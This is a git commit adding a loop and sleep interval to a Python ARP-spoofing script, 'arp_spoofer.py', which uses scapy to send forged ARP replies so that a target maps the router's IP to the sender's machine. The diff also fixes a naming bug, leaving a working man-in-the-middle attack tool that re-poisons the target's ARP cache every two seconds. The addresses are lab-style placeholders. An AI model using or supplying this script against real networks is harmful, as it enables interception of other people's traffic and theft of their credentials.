a44452c3682c4202fc24d48b631e34f4e47bbdc7
keraattin <kerem-oruc@outlook.com>
2021-01-04 21:27:23 +0300

    While Loop and Sleep Time Added

--- arp_spoofer/arp_spoofer.py
+++ arp_spoofer/arp_spoofer.py
@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
+
 import scapy.all as scapy
+import time
 
 
 # Gloabal Variables
@@ -10,16 +12,17 @@ TARGET_MAC_ADDR = "aa:bb:cc:dd:ee:ff"             # Target MAC Address
 ROUTER_IP = "10.0.2.1"                            # Router Ip Address
 ROUTER_MAC_ADDR = "11:22:33:44:55:66"             # Router MAC Address
 OPERATION = 2                                     # Arp Response Package
+SLEEP_TIME = 2                                    # Sleep Time
 ##############################################################################
 
 
 def spoof_arp(target_ip, target_mac, spoofed_ip):
     package = scapy.ARP()                         # ARP Package Generated
-    packet.op = OPERATION                         # Set Operation to Response
-    packet.pdst = target_ip                       # Set Target Ip Address
-    packet.hwdst = target_mac                     # Set Target MAC Address
-    packet.psrc = spoofed_ip                      # Set Router Ip Address 
-    scapy.send(package)                           # Send the Package
+    package.op = OPERATION                        # Set Operation to Response
+    package.pdst = target_ip                      # Set Target Ip Address
+    package.hwdst = target_mac                    # Set Target MAC Address
+    package.psrc = spoofed_ip                     # Set Router Ip Address 
+    scapy.send(package,verbose=False)             # Send the Package
 
 
 def main():
@@ -31,4 +34,6 @@ def main():
 
 
 if __name__ == '__main__':
-    main()
+    while True:
+        main()
+        time.sleep(SLEEP_TIME)
